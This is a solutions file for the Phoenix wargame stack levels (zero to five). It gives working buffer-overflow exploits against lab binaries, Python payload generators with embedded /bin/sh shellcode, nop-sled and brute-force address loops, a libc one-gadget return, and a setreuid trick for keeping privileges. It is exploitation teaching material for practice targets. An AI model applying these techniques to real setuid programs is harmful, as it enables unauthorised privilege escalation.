@@ -1,0 +1,552 @@
+(if amd64 is missing, the solution is the same as for i486)
+
+				--------------
+				 Stack Zero
+				--------------
+
+	python -c 'print "A"*65' | /opt/phoenix/i486/stack-zero
+
+
+
+				--------------
+				 Stack One
+				--------------
+
+	/opt/phoenix/i486/stack-one $(python -c 'print "A"*64+"bYlI"')
+
+
+
+				--------------
+				 Stack Two
+				--------------
+
+	ExploitEducation=$(python -c 'print "A"*64+"\x0d\x0a\x09\x0a"[::-1]') /opt/phoenix/i486/stack-two
+
+
+
+				--------------
+				 Stack Three
+				--------------
+
+- to obtain the address of complete_level:
+
+	nm /opt/phoenix/i486/stack-three | grep complete_level
+	objdump -t /opt/phoenix/i486/stack-three | grep complete_level
+	readelf -s /opt/phoenix/i486/stack-three | grep complete_level
+	gdb -q -ex 'p complete_level' -ex q /opt/phoenix/i486/stack-three
+
+	i486: 	0x08048535
+	amd64:	0x000000000040061d
+
+- to inject the arc:
+
+	python -c 'print "A"*64+"\x08\x04\x85\x35"[::-1]' | /opt/phoenix/i486/stack-three
+	python -c 'print "A"*64+"\x40\x06\x9d"[::-1]' | /opt/phoenix/amd64/stack-three 
+
+Note: amd64 works because the destination quadword already contains the
+necessary zeroes.  However, since the program uses gets(), we could have
+injected them as well.
+
+
+
+				--------------
+				 Stack Four
+				--------------
+
+- to obtain the offset of the return address from the buffer:
+
+	i486:
+	cyclic 100 | /opt/phoenix/i486/stack-four
+	# the program prints the new return value: 0x61616175
+	cyclic -l 0x61616175
+	# 80
+
+	amd64:
+	cyclic 100 | /opt/phoenix/amd64/stack-four
+	# 0x6161617861616177
+	cyclic -l 0x61616177		# note: subpattern must be 4 bytes
+	# 88
+
+- obtain the address of complete_level as in Stack Three:
+
+	i486: 	0x080484e5
+	amd64:	0x000000000040061d
+
+- inject the arc like in Stack Three:
+
+	python -c 'print "A"*80+"\x08\x04\x84\xe5"[::-1]' | /opt/phoenix/i486/stack-four
+	python -c 'print "A"*88+"\x40\x06\x1d"[::-1]' | /opt/phoenix/amd64/stack-four
+
+Note: amd64 works because the previous return address already contained
+the necessary zeroes (it was 0x40068d), but since the program uses gets()
+we could have injected them as well.
+
+
+
+				--------------
+				 Stack Five
+				--------------
+
+* shellcode in the buffer
+
+The main problem is obtaining the buffer address, which may shift around
+due to differences in the enviroment variables and program arguments,
+which in turn depend on how we run the binary.  This affects us since it
+is normal to study the binary in gdb, or to make a copy since suid binaries
+don't dump cores when run by normal users.  The exploit developed in
+this way may not be directly applicable to the target binary, if the
+differences in the stacks are not accounted for.
+
+Bash environment variables to keep track of:
+
+	PWD	# what the pwd internal command will print 
+		# (it may differ from the output of /bin/pwd because of symlinks)
+	OLDPWD  # were 'cd -' will bring you; created the first time you
+		# issue a 'cd' command
+	_	# contains the path of the command; if PATH is used,
+		# this is the path after PATH search
+
+	if connected via ssh:
+
+	SSH_AUTH_SOCK	# socket connected with the ssh-agent; absent if the
+			# agent is not forwarded or started; when present,
+			# it changes from one connection to another and the
+			# last number may differ in size
+	SSH_CLIENT, SSH_CONNECTION
+			# the second number is the port of the client and
+			# changes with each connection (unless connection
+			# reuse is active)
+	SSH_TTY		# the pseudo-tty used by the ssh client
+
+	Also, note that the ssh client will always send your TERM variable
+	to the server and, depending on the SendEnv option in
+	/etc/ssh/ssh_config, it may also send additional environment
+	variables (e.g., LANG and all the LC_* variables). Therefore,
+	you may see differences when you connect from different computers.
+	
+gdb adds COLUMNS and LINES, while _ is set to the path of gdb itself.
+sudo removes many variables (e.g., SSH_*, depending on config) and adds
+its own (USERNAME, SUDO_UID, SUDO_GID, SUDO_COMMAND, SUDO_USER).
+
+We also need to be careful with argv[0], which both the shell and gdb
+set to the path of the program itself; gdb, however, apparently
+transforms relative paths into absolute ones.
+
+For this exploit we can equalize the environment and argv[0] by not
+changing the working directory and creating copies and links so that the
+command paths look the same.  We also need to do everything in the same
+ssh session, so that the other variables don't change.  In this way we can
+be extremely precise and jump directly at the start of the shellcode.
+To simplify the use of gdb below, we also use absolute paths.
+
+For this exploit is also possibile to completely clean up the environment
+prepending 'env -i' to each stack-five invocation, since the binary
+does not use any environment variable. We still need to take care of
+argv[0], though.
+
+- to obtain the offset of the return address from the buffer and the
+absolute address of the buffer:
+
+   i486:
+
+	rm -f stack-five
+	cp /opt/phoenix/i486/stack-five .	# remove suid, to get core dumps
+	ulimit -c unlimited
+	rm /var/lib/coredumps/*
+	cd 					# make sure OLDPWD=PWD
+	cyclic 200 | /home/user/stack-five
+	gdb -ex 'p $esp' -ex q ./stack-five /var/lib/coredumps/*
+	# eip is 0x6261616b
+	# esp is 0xffffd5d0	(yours may differ because of SSH_* vars)
+	cyclic -l 0x6261616b
+	# offset is 140
+
+the i486 crash occurs after the address has been loaded, while trying
+to fetch the next instruction. Accordingly, esp points below the saved
+eip. The buffer starts at
+
+		0xffffd5d0 - (140 + 4) = 0xffffd540
+
+
+   amd64:
+	
+	rm -f stack-five
+	cp /opt/phoenix/amd64/stack-five .
+	ulimit -c unlimited
+	rm /var/lib/coredumps/*
+	cd 					# make sure OLDPWD=PWD
+	cyclic 200 | /home/user/stack-five
+	gdb -q -ex 'p $rsp' -ex 'p *(unsigned int *)$rsp' -ex q ./stack-five /var/lib/coredumps/*
+	# the saved rip is 0x6261616a
+	# rsp is 0x7fffffffe4e8		(as above, yours may differ)
+	cyclic -l 0x6261616a
+	# offset is 136
+
+amd64 crashes the program before loading the overwritten address into
+rip, because the address is not normalized. Accordingly, rsp points to
+the saved rip and not below. We recover the cyclic pattern by reading
+the unsigned int stored at rsp.  The start of the buffer is at
+
+		0x7fff ffff e4e8 - 136 = 0x7fff ffff e460
+
+Alternative ways to proceed.
+
+The offset can be obtained by studying the code. Lookup the gets@plt
+call and check its first argument (top of stack for i486, %rdi for amd64).
+
+   i486:
+
+08048485 <start_level>:
+ 8048485:       55                      push   %ebp
+ 8048486:       89 e5                   mov    %esp,%ebp
+ 8048488:       81 ec 88 00 00 00       sub    $0x88,%esp
+ 804848e:       83 ec 0c                sub    $0xc,%esp
+ 8048491:       8d 85 78 ff ff ff       lea    -0x88(%ebp),%eax
+ 8048497:       50                      push   %eax
+ 8048498:       e8 23 fe ff ff          call   80482c0 <gets@plt>
+ 804849d:       83 c4 10                add    $0x10,%esp
+ 80484a0:       90                      nop
+ 80484a1:       c9                      leave  
+ 80484a2:       c3                      ret
+
+the top of the stack before the call contains -0x88(%ebp).  Since %ebp
+points one stack-line above the saved %eip, the offset is
+
+			0x88 + 4 = 140.
+	
+   amd64:
+
+000000000040058d <start_level>:
+  40058d:       55                      push   %rbp
+  40058e:       48 89 e5                mov    %rsp,%rbp
+  400591:       48 83 c4 80             add    $0xffffffffffffff80,%rsp
+  400595:       48 8d 45 80             lea    -0x80(%rbp),%rax
+  400599:       48 89 c7                mov    %rax,%rdi
+  40059c:       e8 4f fe ff ff          callq  4003f0 <gets@plt>
+  4005a1:       90                      nop
+  4005a2:       c9                      leaveq 
+  4005a3:       c3                      retq
+
+
+%rdi receives (through %rax) -0x80(%rbp). Since %rbp is one stack-line
+above the saved %rip, the offset is
+
+			0x80 + 8 = 136.
+
+To obtain the absolute address (or even the offset) we can use gdb. We
+need to take care of the stack shifts or, better, reproduce the exact
+stack of the target program.
+
+   i486:
+	
+	rm -f stack-five
+	cd 					# make sure OLDPWD=PWD
+	ln -s /opt/phoenix/i486/stack-five	# doctor argv[0]
+	gdb /home/user/stack-five
+	> unset environment COLUMNS
+	> unset environment LINES
+	> set environment _=/home/user/stack-five
+	> b start_level
+	> r
+	> n	# 3 times, to reach the call
+	# we can see that the first argument is 0xffffd540
+
+
+   amd64:
+
+	rm -f stack-five
+	cd 					# make sure OLDPWD=PWD
+	ln -s /opt/phoenix/amd64/stack-five	# doctor argv[0]
+	gdb /home/user/stack-five
+	> unset environment COLUMNS
+	> unset environment LINES
+	> set environment _=/home/user/stack-five
+	> b start_level
+	> r
+	> n	# 3 times, to reach the call
+	# we can see that the first argument is 0x7fff ffff e460
+
+- to obtain the shellcode size
+
+
+  i486:
+
+	shellcraft -n -f raw i386.linux.sh | wc -c
+	# 44 bytes
+
+  amd64:
+
+	shellcraft -n -f raw amd64.linux.sh | wc -c
+	# 48 bytes
+
+Note: we pass the '-n' flag to code withouth newlines, which would
+cause gets() to return early. This is just for safety, since the default
+shellcodes are already newline-free.
+
+- to inject the shellcode
+
+   i486:
+
+	rm -f stack-five
+	ln -s /opt/phoenix/i486/stack-five
+	( shellcraft -n -f raw i386.linux.sh; python -c 'print "A"*(140-44) + "\xff\xff\xd5\x40"[::-1]'; cat ) | /home/user/stack-five
+	# id should show euid 505
+
+   amd64:
+
+	rm -f stack-five
+	ln -s /opt/phoenix/i486/stack-five
+	( shellcraft -n -f raw amd64.linux.sh; python -c 'print "A"*(136-48) + "\x7f\xff\xff\xff\xe4\x60"[::-1]'; cat ) | /home/user/stack-five
+	# id should show euid 405
+
+Note that the saved rip already contains the needed zeroes in the high
+portion of the address, but since the program uses gets() we could have
+injected them as well.
+
+- nop-sled
+
+To make the calculation of the absolute address of the buffer less
+stringent, you can try to insert the shellcode in the buffer after a
+nop-sled, but the shellcode will have to push words on the stack and, if
+we are not careful, it could end up overwriting itself. We have to leave
+enough space at the end of the buffer to act as a stack for the shellcode.
+
+Consider, for example, i486. If we inspect the shellcode produced by
+
+	shellcraft -n -f asm i386.linux.sh
+
+we see that it pushes at most seven words on the stack. Remember that,
+when the shellcode starts running, esp points below the saved eip.
+Therefore, these 'push' instructions will first overwrite our saved eip
+(it's OK, at that point we have already used it and we don't need it
+again) and then they will start overwriting the lower portion of the buffer,
+where our shellcode lives.
+
+Taking this into account, we create a paylod that starts with a nop sled
+of 72 bytes, followed by the shellcode (44 bytes) and finally by 24 more
+bytes to reach the saved eip, which we overwrite with an address in the
+middle of the nop sled:
+	
+	0xffffd540 + 72/2 = 0xffffd564
+
+The 24 padding bytes and the saved eip (28 bytes total) exactly
+accomodate the seven pushes of the shellcode.
+
+Consider that that would be the return address if the stack top in the
+target binary were at the exact same address as it was when we developed
+the exploit. This is not true in general, but, because of the nop-sled,
+we can tolerate differences of up to 72/2 bytes in each direction. To
+prove this, we run the target binary using a path different from the one
+we used during exploit-development. This will cause differences in both
+argv[0] and in the _ environment variable.
+
+Note that stacks are always aligned to 16 bytes, so the difference will
+be a multiple of 16 (possibly even zero, if there is enough
+padding room).
+
+Putting it all together:
+
+	( python -c 'import sys; sys.stdout.write("\x90" * 72)'; shellcraft -n -f raw i386.linux.sh; python -c 'print "A"*24 + "\xff\xff\xd5\x64"[::-1]'; cat ) | /opt/phoenix/i486/stack-five		
+
+Note that we need to avoid the newline output by python's print, since
+that would terminate the gets() prematurely.  
+
+For amd64, the shellcode pushes 6 words, each 8 bytes long. The shellcode
+is 48 bytes and, at the beginning of shellcode execution, rsp points at the
+saved rip, so that the first push will go straight into the buffer.
+This leaves room for a nop-sled of 136 - 48 - 6*8 = 40 bytes, which
+may be just barely enough. If we want to jump in the middle of the nop-sled,
+we use the return address of
+
+		0x7fff ffff e460 + 40/2 = 0x7fff ffff e474
+
+Putting it all together:
+
+( python -c 'import sys; sys.stdout.write("\x90" * 40)'; shellcraft -n -f raw amd64.linux.sh; python -c 'print "A"*48 + "\x7f\xff\xff\xff\xe4\x74"[::-1]'; cat ) | /opt/phoenix/amd64/stack-five
+
+- brute forcing
+
+Even using the nop-sled, expecially when it is very small, the attack may fail
+due to large differences in the stack offsets. We should not despair, however:
+we can repeat the attack several times, at different addresses, until it
+succededs. The nop-sled, in this case, it is useful in reducing the number
+of addressed that need to be tried.
+
+To mount this attack we create a script that outputs the payload, given
+a base stack address:
+
+	import struct
+	import sys
+
+	# shellcraft -n -f string i386.linux.sh
+	shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
+	shstack   = 4*7
+	offset    = 140
+	esp       = int(sys.argv[1], 0)
+
+	bufstart  = esp - (offset + 4)
+	nopsled   = offset - len(shellcode) - shstack
+	jmptarget = bufstart + nopsled/2
+
+	payload  = "\x90" * nopsled
+	payload += shellcode
+	payload += "A" * shstack
+	payload += struct.pack('I', jmptarget)
+
+	print payload
+	
+Then we try every possibile esp address starting from the bottom of stack, at 72 bytes
+decrements (the size of the nop-sled):
+
+	for ((i=0xffffe000; i >= 0xfffdd000; i -= 72)); do printf "%#x..\n" $i; ( python stack-five.py $i; python -c 'print " "*4096 + "id"' ) | /opt/phoenix/i486/stack-five ; done 2>/dev/null | sed '/^uid/q'
+
+The limits of the stack area can be obtained by running the program in gdb
+and using gef vmmap command. They are also available in /proc/$PID/maps
+while the program is running (indeed, this is where gdb takes them from).
+The 4096 spaces are meant to fill the stdio buffer used by gets() before
+it has any chance to swallow the id command, which would then not
+be seen by the shell even if the exploit is successful.
+The final sed command stops everything as soon as it sees a line starting with 'uid'
+This line is output by the id command and signals that we got a shell.
+
+For completeness, we also show the exploit for amd64.
+The payload:
+
+	import struct
+	import sys
+
+	# shellcraft -n -f string amd64.linux.sh
+	shellcode = "jhH\xb8\x2fbin\x2f\x2f\x2fsPH\x89\xe7hri\x01\x01\x814\x24\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"
+	shstack   = 8*6
+	offset    = 136
+	rsp       = int(sys.argv[1], 0)
+
+	bufstart  = rsp - offset
+	nopsled   = offset - len(shellcode) - shstack
+	jmptarget = bufstart + nopsled/2
+
+	payload  = "\x90" * nopsled
+	payload += shellcode
+	payload += "A" * shstack
+	payload += struct.pack('Q', jmptarget)
+
+	print payload
+
+and the brute force:
+
+	for ((i=0x00007ffffffff000; i >= 0x00007ffffffde000; i -= 40)); do printf "%#x..\n" $i; ( python stack-five-64.py $i; python -c 'print " "*4096 + "id"' ) | /opt/phoenix/amd64/stack-five ; done 2>/dev/null | sed '/^uid/q'
+
+* shellcode after the saved rip
+
+This is easier, since we can put a reasonably long nop sled before the
+shellcode and jump in the middle of it, therefore tolerating large offsets
+in the stack addresses.
+E.g., with a nop sled of 1000 we jump at 0xffffd5d0 + 500 = 0xffffd7c4
+
+	( python -c 'import sys; sys.stdout.write("A"*140+"\xff\xff\xd7\xc4"[::-1] + "\x90"*1000)'; shellcraft -n -f raw i386.linux.sh; echo; cat ) | /opt/phoenix/i486/stack-five
+
+Note how we have used the stack address obtained by running
+/home/user/stack-five to attack /opt/phoenix/i486/stack-five. The nop
+sled allows us to tolerate stack offsets up to 500 bytes long.
+
+The newline output by echo after the shellcode is just a convenience:
+if the echo is removed we need to type a first line in cat to terminate
+the gets().
+
+For amd64 the target is at 0x7fffffffe4e8 + 508 = 0x7f ff ff ff e6 e4
+
+	( python -c 'import sys; sys.stdout.write("A"*136+"\x00\x00\x7f\xff\xff\xff\xe6\xe4"[::-1] + "\x90"*1000)'; shellcraft -n -f raw amd64.linux.sh; echo; cat ) | /opt/phoenix/amd64/stack-five
+
+Note that we need to provide the zeroes to complete the address before
+starting the nop sled.  We can do this since the program uses gets()
+that only stops at newlines.
+
+Note that a very large nop-sled may cause the gets() to try to write
+past the bottom of the stack, causing a segmentation fault.
+If the nop-sled is not sufficiently large, we can always resort to
+brute-forcing.
+
+* wihthout injecting shellcode
+
+Even if we cannot inject shellcode (e.g., small buffer) or the CPU
+won't execute it (e.g., NX), the ability to overwrite a saved eip/rip is
+usually sufficient to gain control of the executable, since some form
+of shellcode can often be found in the process memory (usually in the
+libc code). 'one_gadget' is able to find these shellcodes, but we need
+to give it the path of the C library. Exploit Educaation binaries are
+linked agains musl, installed in /opt/phoenix/{i486,x86_64}-linux-musl.
+
+If we run one_gadget on the i486 version of libc we obtain:
+
+	$ one_gadget /opt/phoenix/i486-linux-musl/lib/libc.so
+	0x36cac execl("/bin/sh", eax)
+	constraints:
+	  ebx is the GOT address of libc
+	  eax == NULL
+	
+	0x36cad execl("/bin/sh", [esp])
+	constraints:
+	  ebx is the GOT address of libc
+	  [esp] == NULL
+
+For each gadget we get its offset inside the libc .text and a set of
+constraints that must be met in order to use it. To get the address
+of the gadget we need to add the base of the libc in the process 
+memory. This can be obtained with gdb (info proc mappins, or vmmap
+if using GEF), or by typing
+
+	cat /proc/$(pgrep stack-five)/maps
+
+in another shell while the program is running.  In our case, the base
+address is 0xf7f6d000 and the two gadgets are at
+
+	0xf7f6d000 + 0x36cac = 0xf7fa3cac
+	0xf7f6d000 + 0x36cad = 0xf7fa3cad
+
+These two addresses won't change from one execution to another, so we
+don't need to care about stack differences. However, we need to check
+that the constrains are met. This can be done with gdb, by looking at
+the state of the program when it is about to execute the 'ret' that we
+want to control. In our case we see that eax is not-null, but the top of
+the stack (below the saved rip) is null, so we can use the second gadget.
+Note that the GOT address in ebx will be OK, unless the function has
+saved/restored ebx and we have overwritten the saved value. In that case,
+we will have to put the correct value of ebx in the payload.
+
+Putting it all together:
+
+ ( python -c 'print "A"*140 + "\xf7\xfa\x3c\xad"[::-1]'; cat ) | /opt/phoenix/i486/stack-five
+
+
+* setuid/setgid bits and shells
+
+The above exploits will turn stack-five into a shell, but normally this
+won't also cause a privilege escalation. This is because all modern shells
+execute
+
+	setreuid(getuid(), getuid());
+	setregid(getgid(), getgid());
+
+before doing anything. This will set the effective user-id and group-id
+back to the real ones, effectively disabling the setuid/setgid bits.
+The rationale is that a setuid/setgid shell doesn't make any sense and,
+if the real and effective ids differ it is probably the result of an
+exploit. The /bin/sh binary installed in Exploit Education is a modified
+one, which does not resets the ids in order to simplify the exploits.
+However, if you happen to update dash and or bash, you will end up with
+the normal releases of these shells and the exploits will no longer give
+you a priviliged shell. There is not much we can do for the exploit
+based on existing gadgets, but we can easily salvage the ones based on
+code injection. The trick is to run
+
+	setreuid(geteuid(), geteuid());
+	setregid(getegid(), getegid());
+
+before exec()ing the shell. This will set the real ids equal to the
+effective ones, so that the shell will not be able to revert them
+back. This can be obtained by concatenating a few shellcodes:
+
+	shellcraft -n -f raw i386.linux.setreuid; shellcraft -n -f raw i386.linux.setregid; shellcraft -n -f raw i386.linux.sh
+
+And similaryl for amd64. Of course this will change the the shellcode
+size, which is now 72 bytes for i386 and 80 bytes for amd64.
